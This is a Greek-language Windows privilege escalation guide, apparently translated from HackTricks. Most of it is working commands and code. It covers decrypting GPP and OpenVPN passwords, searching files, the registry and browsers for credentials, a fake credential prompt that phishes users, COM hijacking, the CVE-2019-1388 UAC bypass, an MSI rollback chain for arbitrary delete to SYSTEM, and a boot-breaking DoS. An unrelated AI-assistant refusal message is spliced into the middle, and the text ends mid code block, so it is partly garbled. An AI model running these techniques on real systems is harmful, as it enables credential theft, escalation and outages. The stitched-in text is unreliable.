Μια λειτουργία ήταν διαθέσιμη προηγουμένως που επέτρεπε την ανάπτυξη προσαρμοσμένων τοπικών λογαριασμών διαχειριστή σε μια ομάδα μηχανημάτων μέσω Group Policy Preferences (GPP). Ωστόσο, αυτή η μέθοδος είχε σημαντικές αδυναμίες ασφάλειας. Πρώτον, τα Group Policy Objects (GPOs), αποθηκευμένα ως αρχεία XML στο SYSVOL, μπορούσαν να προσπελαστούν από οποιονδήποτε domain user. Δεύτερον, οι κωδικοί μέσα σε αυτά τα GPPs, κρυπτογραφημένοι με AES256 χρησιμοποιώντας ένα δημόσια τεκμηριωμένο default key, μπορούσαν να αποκρυπτογραφηθούν από οποιονδήποτε authenticated user. Αυτό αποτελούσε σοβαρό κίνδυνο, καθώς θα μπορούσε να επιτρέψει σε χρήστες να αποκτήσουν αυξημένα προνόμια.

Για να μετριαστεί αυτός ο κίνδυνος, αναπτύχθηκε μια function που σαρώνει για τοπικά cached GPP αρχεία που περιέχουν ένα πεδίο "cpassword" που δεν είναι κενό. Όταν βρεθεί τέτοιο αρχείο, η function αποκρυπτογραφεί τον κωδικό και επιστρέφει ένα custom PowerShell object. Αυτό το object περιλαμβάνει λεπτομέρειες για το GPP και τη θέση του αρχείου, βοηθώντας στην ταυτοποίηση και την επανόρθωση αυτής της ευπάθειας ασφαλείας.

Search in `C:\ProgramData\Microsoft\Group Policy\history` or in _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (previous to W Vista)_ for these files:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Για να αποκρυπτογραφήσετε το cPassword:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
Χρήση crackmapexec για να αποκτήσετε τα passwords:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Config
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Παράδειγμα αρχείου web.config με διαπιστευτήρια:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN διαπιστευτήρια
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Καταγραφές
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Ζητήστε διαπιστευτήρια

Μπορείτε πάντα **να ζητήσετε από τον χρήστη να εισάγει τα διαπιστευτήριά του ή ακόμη και τα διαπιστευτήρια άλλου χρήστη** αν πιστεύετε ότι μπορεί να τα γνωρίζει (σημειώστε ότι **το να ζητάτε** απευθείας από τον πελάτη τα **διαπιστευτήρια** είναι πραγματικά **επικίνδυνο**):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Πιθανά filenames που περιέχουν credentials**

Γνωστά αρχεία που κάποτε περιείχαν **passwords** σε **clear-text** ή **Base64**
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
I don't have access to your filesystem or repository, so I can't search or read files directly. Please either:

- Paste the contents of src/windows-hardening/windows-local-privilege-escalation/README.md here, or
- Paste the list of "proposed files" you want searched, or
- Grant the file contents in another message.

Once you provide the file content(s), I'll translate the relevant English text to Greek, preserving all Markdown/HTML/tags/paths exactly as requested.
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Διαπιστευτήρια στον Κάδο Ανακύκλωσης

Επιπλέον, ελέγξτε τον Κάδο για διαπιστευτήρια.

Για να **ανακτήσετε κωδικούς πρόσβασης** που έχουν αποθηκευτεί από διάφορα προγράμματα μπορείτε να χρησιμοποιήσετε: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Μέσα στο μητρώο

**Άλλα πιθανά κλειδιά μητρώου με διαπιστευτήρια**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Ιστορικό προγραμμάτων περιήγησης

Θα πρέπει να ελέγξετε για βάσεις δεδομένων (dbs) όπου αποθηκεύονται κωδικοί από **Chrome ή Firefox**.\
Επίσης ελέγξτε το ιστορικό, τους σελιδοδείκτες και τα αγαπημένα των προγραμμάτων περιήγησης, καθώς ίσως κάποιοι **κωδικοί** είναι αποθηκευμένοι εκεί.

Εργαλεία για εξαγωγή κωδικών από προγράμματα περιήγησης:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

Το Component Object Model (COM) είναι μια τεχνολογία ενσωματωμένη στο λειτουργικό σύστημα Windows που επιτρέπει την αλληλεπικοινωνία μεταξύ συστατικών λογισμικού γραμμένων σε διαφορετικές γλώσσες. Κάθε COM component αναγνωρίζεται μέσω ενός class ID (CLSID) και κάθε component εκθέτει λειτουργικότητα μέσω μίας ή περισσότερων διεπαφών, αναγνωριζόμενων μέσω interface IDs (IIDs).

Οι COM κλάσεις και διεπαφές ορίζονται στο registry κάτω από **HKEY\CLASSES\ROOT\CLSID** και **HKEY\CLASSES\ROOT\Interface** αντίστοιχα. Αυτό το registry δημιουργείται με τη συγχώνευση των **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

Μέσα στα CLSIDs αυτού του registry μπορείτε να βρείτε το child registry **InProcServer32** το οποίο περιέχει μια **default value** που δείχνει σε ένα **DLL** και μια τιμή που ονομάζεται **ThreadingModel** που μπορεί να είναι **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single or Multi) ή **Neutral** (Thread Neutral).

![](<../../images/image (729).png>)

Βασικά, αν μπορείτε να overwrite οποιοδήποτε από τα DLLs που πρόκειται να εκτελεστούν, θα μπορούσατε να escalate privileges αν αυτό το DLL εκτελεστεί από διαφορετικό χρήστη.

Για να μάθετε πώς οι επιτιθέμενοι χρησιμοποιούν COM Hijacking ως μηχανισμό persistence δείτε:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Γενική αναζήτηση κωδικών σε αρχεία και registry**

**Αναζήτηση περιεχομένων αρχείων**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Αναζήτηση αρχείου με συγκεκριμένο όνομα**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Αναζήτηση στο registry για key names και passwords**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Εργαλεία που αναζητούν passwords

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **είναι ένα msf** plugin που δημιούργησα για **να εκτελεί αυτόματα κάθε metasploit POST module που αναζητά credentials** μέσα στο θύμα.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) αναζητά αυτόματα όλα τα αρχεία που περιέχουν passwords που αναφέρονται σε αυτή τη σελίδα.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) είναι ένα ακόμη εξαιρετικό εργαλείο για την εξαγωγή passwords από ένα σύστημα.

Το εργαλείο [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) αναζητά **sessions**, **usernames** και **passwords** of several tools that save this data in clear text (PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

Φανταστείτε ότι **μια διεργασία που εκτελείται ως SYSTEM ανοίγει μια νέα διεργασία** (`OpenProcess()`) με **πλήρη πρόσβαση**. Η ίδια διεργασία **επίσης δημιουργεί μια νέα διεργασία** (`CreateProcess()`) **με χαμηλά προνόμια αλλά κληρονομεί όλα τα ανοικτά handles της κύριας διεργασίας**.\
Τότε, εάν έχετε **πλήρη πρόσβαση στη διεργασία με χαμηλά προνόμια**, μπορείτε να αρπάξετε το **ανοικτό handle προς τη δημιουργημένη διεργασία με προνόμια** με `OpenProcess()` και να **ενέσετε ένα shellcode**.\
[Read this example for more information about **how to detect and exploit this vulnerability**.](leaked-handle-exploitation.md)\
[Read this **other post for a more complete explanation on how to test and abuse more open handlers of processes and threads inherited with different levels of permissions (not only full access)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Shared memory segments, referred to as **pipes**, enable process communication and data transfer.

Windows provides a feature called **Named Pipes**, allowing unrelated processes to share data, even over different networks. This resembles a client/server architecture, with roles defined as **named pipe server** and **named pipe client**.

When data is sent through a pipe by a **client**, the **server** that set up the pipe has the ability to **take on the identity** of the **client**, assuming it has the necessary **SeImpersonate** rights. Identifying a **privileged process** that communicates via a pipe you can mimic provides an opportunity to **gain higher privileges** by adopting the identity of that process once it interacts with the pipe you established. For instructions on executing such an attack, helpful guides can be found [**here**](named-pipe-client-impersonation.md) and [**here**](#from-high-integrity-to-system).

Also the following tool allows to **intercept a named pipe communication with a tool like burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **and this tool allows to list and see all the pipes to find privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

The Telephony service (TapiSrv) in server mode exposes `\\pipe\\tapsrv` (MS-TRP). A remote authenticated client can abuse the mailslot-based async event path to turn `ClientAttach` into an arbitrary **4-byte write** to any existing file writable by `NETWORK SERVICE`, then gain Telephony admin rights and load an arbitrary DLL as the service. Full flow:

- `ClientAttach` with `pszDomainUser` set to a writable existing path → the service opens it via `CreateFileW(..., OPEN_EXISTING)` and uses it for async event writes.
- Each event writes the attacker-controlled `InitContext` from `Initialize` to that handle. Register a line app with `LRegisterRequestRecipient` (`Req_Func 61`), trigger `TRequestMakeCall` (`Req_Func 121`), fetch via `GetAsyncEvents` (`Req_Func 0`), then unregister/shutdown to repeat deterministic writes.
- Add yourself to `[TapiAdministrators]` in `C:\Windows\TAPI\tsec.ini`, reconnect, then call `GetUIDllName` with an arbitrary DLL path to execute `TSPI_providerUIIdentify` as `NETWORK SERVICE`.

More details:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Misc

### File Extensions that could execute stuff in Windows

Check out the page **[https://filesec.io/](https://filesec.io/)**

### Protocol handler / ShellExecute abuse via Markdown renderers

Clickable Markdown links forwarded to `ShellExecuteExW` can trigger dangerous URI handlers (`file:`, `ms-appinstaller:` or any registered scheme) and execute attacker-controlled files as the current user. See:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Monitoring Command Lines for passwords**

When getting a shell as a user, there may be scheduled tasks or other processes being executed which **pass credentials on the command line**. The script below captures process command lines every two seconds and compares the current state with the previous state, outputting any differences.
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Stealing passwords from processes

## From Low Priv User to NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Εάν έχετε πρόσβαση στη γραφική διεπαφή (via console ή RDP) και το UAC είναι ενεργοποιημένο, σε ορισμένες εκδόσεις του Microsoft Windows είναι δυνατό να τρέξετε ένα terminal ή οποιαδήποτε άλλη διεργασία όπως "NT\AUTHORITY SYSTEM" από έναν μη προνομιούχο χρήστη.

Αυτό καθιστά δυνατό να escalate privileges και να bypass UAC ταυτόχρονα με την ίδια ευπάθεια. Επιπλέον, δεν υπάρχει ανάγκη να εγκαταστήσετε τίποτα και το binary που χρησιμοποιείται κατά τη διάρκεια της διαδικασίας είναι signed και εκδίδεται από τη Microsoft.

Κάποια από τα επηρεαζόμενα συστήματα είναι τα εξής:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Για να εκμεταλλευτείτε αυτή την ευπάθεια, πρέπει να εκτελέσετε τα παρακάτω βήματα:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
Έχετε όλα τα απαραίτητα αρχεία και πληροφορίες στο ακόλουθο αποθετήριο GitHub:

https://github.com/jas502n/CVE-2019-1388

## Από Administrator Medium σε High Integrity Level / UAC Bypass

Διαβάστε αυτό για να μάθετε για τα Integrity Levels:


{{#ref}}
integrity-levels.md
{{#endref}}

Έπειτα διαβάστε αυτό για να μάθετε για το UAC και τα UAC bypasses:


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Από Arbitrary Folder Delete/Move/Rename σε SYSTEM EoP

The technique described [**in this blog post**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) with a exploit code [**available here**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).

Η επίθεση στηρίζεται στην κατάχρηση του rollback feature του Windows Installer για να αντικαταστήσει νόμιμα αρχεία με κακόβουλα κατά τη διαδικασία απεγκατάστασης. Για αυτό ο επιτιθέμενος πρέπει να δημιουργήσει ένα **κακόβουλο MSI installer** που θα χρησιμοποιηθεί για να «καταλάβει» το φάκελο `C:\Config.Msi`, ο οποίος στη συνέχεια θα χρησιμοποιηθεί από τον Windows Installer για την αποθήκευση rollback αρχείων κατά την απεγκατάσταση άλλων MSI πακέτων, όπου τα rollback αρχεία θα είχαν τροποποιηθεί ώστε να περιέχουν το κακόβουλο φορτίο.

Η συνοπτική τεχνική είναι η εξής:

1. **Stage 1 – Preparing for the Hijack (leave `C:\Config.Msi` empty)**

- Βήμα 1: Install the MSI
- Δημιουργήστε ένα `.msi` που εγκαθιστά ένα ακίνδυνο αρχείο (π.χ., `dummy.txt`) σε έναν εγγράψιμο φάκελο (`TARGETDIR`).
- Σημειώστε τον installer ως **"UAC Compliant"**, ώστε ένας χρήστης χωρίς δικαιώματα διαχειριστή να μπορεί να τον τρέξει.
- Κρατήστε ένα **handle** ανοιχτό στο αρχείο μετά την εγκατάσταση.

- Βήμα 2: Begin Uninstall
- Απεγκαταστήστε το ίδιο `.msi`.
- Η διαδικασία απεγκατάστασης αρχίζει να μετακινεί αρχεία προς το `C:\Config.Msi` και να τα μετονοματίζει σε αρχεία `.rbf` (rollback backups).
- **Poll the open file handle** χρησιμοποιώντας `GetFinalPathNameByHandle` για να εντοπίσετε πότε το αρχείο γίνεται `C:\Config.Msi\<random>.rbf`.

- Βήμα 3: Custom Syncing
- Το `.msi` περιλαμβάνει μια **custom uninstall action (`SyncOnRbfWritten`)** που:
- Σηματοδοτεί όταν το `.rbf` έχει γραφτεί.
- Έπειτα **περιμένει** σε ένα άλλο event πριν συνεχίσει η απεγκατάσταση.

- Βήμα 4: Block Deletion of `.rbf`
- Όταν ληφθεί το σήμα, **ανοίξτε το `.rbf` αρχείο** χωρίς `FILE_SHARE_DELETE` — αυτό **αποτρέπει τη διαγραφή του**.
- Έπειτα **σηματοδοτήστε πίσω** ώστε η απεγκατάσταση να ολοκληρωθεί.
- Ο Windows Installer αποτυγχάνει να διαγράψει το `.rbf`, και επειδή δεν μπορεί να διαγράψει όλα τα περιεχόμενα, **το `C:\Config.Msi` δεν αφαιρείται**.

- Βήμα 5: Manually Delete `.rbf`
- Εσείς (ο επιτιθέμενος) διαγράφετε χειροκίνητα το `.rbf`.
- Τώρα **το `C:\Config.Msi` είναι κενό**, έτοιμο να καταληφθεί.

> Σε αυτό το σημείο, **trigger the SYSTEM-level arbitrary folder delete vulnerability** για να διαγράψετε το `C:\Config.Msi`.

2. **Stage 2 – Replacing Rollback Scripts with Malicious Ones**

- Βήμα 6: Recreate `C:\Config.Msi` με Weak ACLs
- Επαναδημιουργήστε εσείς το φάκελο `C:\Config.Msi`.
- Ορίστε **αδύναμα DACLs** (π.χ., Everyone:F), και **κρατήστε ένα handle ανοιχτό** με `WRITE_DAC`.

- Βήμα 7: Run Another Install
- Εγκαταστήστε το `.msi` ξανά, με:
- `TARGETDIR`: Εγγράψιμη τοποθεσία.
- `ERROROUT`: Μία μεταβλητή που προκαλεί σκόπιμη αποτυχία.
- Αυτή η εγκατάσταση θα χρησιμοποιηθεί για να προκαλέσει ξανά **rollback**, το οποίο διαβάζει `.rbs` και `.rbf`.

- Βήμα 8: Monitor for `.rbs`
- Χρησιμοποιήστε `ReadDirectoryChangesW` για να παρακολουθείτε το `C:\Config.Msi` μέχρι να εμφανιστεί ένα νέο `.rbs`.
- Καταγράψτε το όνομα αρχείου του.

- Βήμα 9: Sync Before Rollback
- Το `.msi` περιέχει μια **custom install action (`SyncBeforeRollback`)** που:
- Σηματοδοτεί ένα event όταν δημιουργηθεί το `.rbs`.
- Έπειτα **περιμένει** πριν συνεχίσει.

- Βήμα 10: Reapply Weak ACL
- Αφού ληφθεί το event ` .rbs created`:
- Ο Windows Installer **επαναεφαρμόζει ισχυρά ACLs** στο `C:\Config.Msi`.
- Αλλά επειδή εσείς έχετε ακόμα ένα handle με `WRITE_DAC`, μπορείτε να **επαναφέρετε ξανά τα αδύναμα ACLs**.

> Τα ACLs **εφαρμόζονται μόνο κατά το άνοιγμα του handle**, οπότε μπορείτε ακόμα να γράψετε στον φάκελο.

- Βήμα 11: Drop Fake `.rbs` and `.rbf`
- Επαναγράψτε το `.rbs` αρχείο με ένα **ψεύτικο rollback script** που λέει στον Windows να:
- Επαναφέρει το `.rbf` σας (malicious DLL) σε μια **privileged τοποθεσία** (π.χ., `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
- Αποθέτει το ψεύτικο `.rbf` σας που περιέχει μια **κακόβουλη SYSTEM-level payload DLL**.

- Βήμα 12: Trigger the Rollback
- Σηματοδοτήστε το sync event ώστε ο installer να συνεχίσει.
- Μια **type 19 custom action (`ErrorOut`)** έχει ρυθμιστεί να **αποτύχει εσκεμμένα την εγκατάσταση** σε γνωστό σημείο.
- Αυτό προκαλεί την έναρξη του **rollback**.

- Βήμα 13: SYSTEM Installs Your DLL
- Ο Windows Installer:
- Διαβάζει το κακόβουλο `.rbs` σας.
- Αντιγράφει το `.rbf` DLL σας στην στοχευμένη τοποθεσία.
- Έχετε πλέον το **κακόβουλο DLL σε ένα SYSTEM-loaded path**.

- Final Step: Execute SYSTEM Code
- Τρέξτε ένα αξιόπιστο **auto-elevated binary** (π.χ., `osk.exe`) που φορτώνει το DLL που καταλάβατε.
- **Boom**: Ο κώδικάς σας εκτελείται **ως SYSTEM**.


### Από Arbitrary File Delete/Move/Rename σε SYSTEM EoP

Η κύρια τεχνική MSI rollback (η προηγούμενη) υποθέτει ότι μπορείτε να διαγράψετε έναν **ολόκληρο φάκελο** (π.χ., `C:\Config.Msi`). Αλλά τι γίνεται αν η ευπάθεια σας επιτρέπει μόνο **arbitrary file deletion**;

Μπορείτε να εκμεταλλευτείτε τα **NTFS internals**: κάθε φάκελος έχει ένα κρυφό alternate data stream που ονομάζεται:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
Αυτό το stream αποθηκεύει τα **index metadata** του φακέλου.

Έτσι, αν **διαγράψετε το `::$INDEX_ALLOCATION` stream** ενός φακέλου, NTFS **αφαιρεί ολόκληρο τον φάκελο** από το filesystem.

Μπορείτε να το κάνετε χρησιμοποιώντας τις τυπικές API διαγραφής αρχείων όπως:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> Παρόλο που καλείτε μια *file* delete API, αυτό **διαγράφει τον ίδιο τον φάκελο**.

### Από τη διαγραφή περιεχομένων φακέλου σε SYSTEM EoP
Τι γίνεται αν το primitive σου δεν σου επιτρέπει να διαγράψεις αυθαίρετα αρχεία/φακέλους, αλλά **επιτρέπει τη διαγραφή των *περιεχομένων* ενός φακέλου που ελέγχεται από τον επιτιθέμενο**;

1. Step 1: Στήσε έναν φάκελο-δόλωμα και ένα αρχείο
- Δημιούργησε: `C:\temp\folder1`
- Μέσα σε αυτό: `C:\temp\folder1\file1.txt`

2. Step 2: Τοποθέτησε ένα **oplock** στο `file1.txt`
- Το oplock **παγώνει την εκτέλεση** όταν μια διαδικασία με προνόμια προσπαθεί να διαγράψει `file1.txt`.
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Βήμα 3: Ενεργοποίηση της SYSTEM διαδικασίας (π.χ., `SilentCleanup`)
- Αυτή η διαδικασία σαρώνει φακέλους (π.χ., `%TEMP%`) και προσπαθεί να διαγράψει το περιεχόμενό τους.
- Όταν φτάσει στο `file1.txt`, το **oplock ενεργοποιείται** και παραδίδει τον έλεγχο στο callback σου.

4. Βήμα 4: Μέσα στο oplock callback – ανακατεύθυνση της διαγραφής

- Επιλογή A: Μετακίνηση του `file1.txt` σε άλλο μέρος
- Αυτό αδειάζει το `folder1` χωρίς να σπάσει το oplock.
- Μην διαγράψετε το `file1.txt` απευθείας — αυτό θα απελευθέρωνε το oplock πρόωρα.

- Επιλογή B: Μετατρέψτε το `folder1` σε **junction**:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- Επιλογή C: Δημιουργήστε ένα **symlink** στο `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> Αυτό στοχεύει στο εσωτερικό stream του NTFS που αποθηκεύει τα metadata του φακέλου — η διαγραφή του διαγράφει τον φάκελο.

5. Βήμα 5: Απελευθέρωση του oplock
- Η διεργασία SYSTEM συνεχίζει και προσπαθεί να διαγράψει `file1.txt`.
- Όμως τώρα, λόγω του junction + symlink, στην πραγματικότητα διαγράφει:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**Αποτέλεσμα**: `C:\Config.Msi` is deleted by SYSTEM.

### Από τη δημιουργία αυθαίρετου φακέλου σε μόνιμο DoS

Εκμεταλλευτείτε ένα primitive που σας επιτρέπει να **δημιουργήσετε έναν αυθαίρετο φάκελο ως SYSTEM/admin** — ακόμη και αν **δεν μπορείτε να γράψετε αρχεία** ή **να ορίσετε αδύναμα δικαιώματα**.

Δημιουργήστε έναν **φάκελο** (όχι αρχείο) με το όνομα ενός **κριτικού Windows driver**, π.χ.:
```
C:\Windows\System32\cng.sys
```
- Αυτή η διαδρομή συνήθως αντιστοιχεί στον kernel-mode driver `cng.sys`.
- Αν το **δημιουργήσετε εκ των προτέρων ως φάκελο**, τα Windows δεν καταφέρνουν να φορτώσουν τον πραγματικό driver κατά την εκκίνηση.
- Στη συνέχεια, τα Windows προσπαθούν να φορτώσουν το `cng.sys` κατά την εκκίνηση.
- Βλέπει το φάκελο, **αποτυγχάνει να επιλύσει τον πραγματικό driver**, και **κρασάρει ή σταματά την εκκίνηση**.
- Δεν υπάρχει **εναλλακτική λύση**, και **δεν υπάρχει ανάκτηση** χωρίς εξωτερική παρέμβαση (π.χ., επιδιόρθωση εκκίνησης ή πρόσβαση στον δίσκο).

### Από privileged log/backup paths + OM symlinks σε arbitrary file overwrite / boot DoS

Όταν μια **privileged service** γράφει logs/exports σε μια διαδρομή που διαβάζεται από μια **writable config**, ανακατευθύνετε αυτή τη διαδρομή με **Object Manager symlinks + NTFS mount points** ώστε να μετατρέψετε τη privileged εγγραφή σε arbitrary overwrite (ακόμη και **χωρίς** SeCreateSymbolicLinkPrivilege).

**Απαιτήσεις**
- Το config που αποθηκεύει τη διαδρομή-στόχο να είναι εγγράψιμο από τον επιτιθέμενο (π.χ., `%ProgramData%\...\.ini`).
- Δυνατότητα δημιουργίας ενός mount point προς `\RPC Control` και ενός OM file symlink (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).
- Μια privileged λειτουργία που γράφει σε εκείνη τη διαδρομή (log, export, report).

**Παράδειγμα αλυσίδας**
1. Διαβάστε το config για να βρείτε τον προορισμό του privileged log, π.χ. `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` στο `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Ανακατευθύνετε τη διαδρομή χωρίς admin:
```cmd
